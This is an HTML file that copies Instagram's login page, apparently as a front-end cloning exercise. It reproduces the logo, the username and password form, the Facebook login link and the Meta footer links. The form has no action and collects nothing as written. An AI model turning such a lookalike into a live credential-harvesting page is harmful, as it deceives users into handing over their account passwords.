<!DOCTYPE html>
<html>

<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Login • Instagram</title>
    <link rel="icon" href="photos/instagram-icon.png">
    <link rel="stylesheet" href="style.css">
</head>

<body>

    <div class="container">

        <div class="phone">
            <img src="photos/phones.png" alt="phones">
        </div>

        <div class="login-box">
            <div class="form-box">
                <div class="logo">
                    <img src="photos/logo.png" alt="instagram_logo">
                </div>

                <form method="Post">
                    <input type="text" placeholder="Phone number, username, or email" required>
                    <input type="password" placeholder="Password" required>
                    <button type="submit">Log In</button>
                </form>

                <div class="divider">
                    <hr class="left-line">
                    <span>OR</span>
                    <hr class="right-line">
                </div>

                <div class="facebook-login">
                    <a href="#">
                        <img src="photos/facebook-icon.png" alt="facebook_logo">
                        Log in with Facebook
                    </a>
                </div>

                <div class="forgot-password">
                    <a href="#">
                        Forgot password?
                    </a>
                </div>

            </div>
            <div class="signup-box">
                <p>Don't have an account? <a href="#">Sign up</a></p>
            </div>

            <div class="download-app">
                <p>Get the app.</p>
                <div class="app-icon">
                    <a href="#">
                        <img src="photos/applestore.png" alt="appstore">
                    </a>

                    <a href="#">
                        <img src="photos/googlestore.png" alt="googlestore">
                    </a>
                </div>
            </div>
        </div>

    </div>

    <footer>
        <div class="footer-links">
            <a href="#">Meta</a>
            <a href="#">About</a>
            <a href="#">Blog</a>
            <a href="#">Jobs</a>
            <a href="#">Help</a>
            <a href="#">API</a>
            <a href="#">Privacy</a>
            <a href="#">Terms</a>
            <a href="#">Locations</a>
            <a href="#">Instagram Lite</a>
            <a href="#">Threads</a>
            <a href="#">Contact Uploading & Non-Users</a>
            <a href="#">Meta Verified</a>
            <a href="#">Meta in Indonesia</a>
        </div>
        <div class="footer-bottom">
            <span>English <span>&#9660;</span></span>
            <span>© 2024 Instagram from Meta</span>
        </div>
    </footer>

</body>

</html>
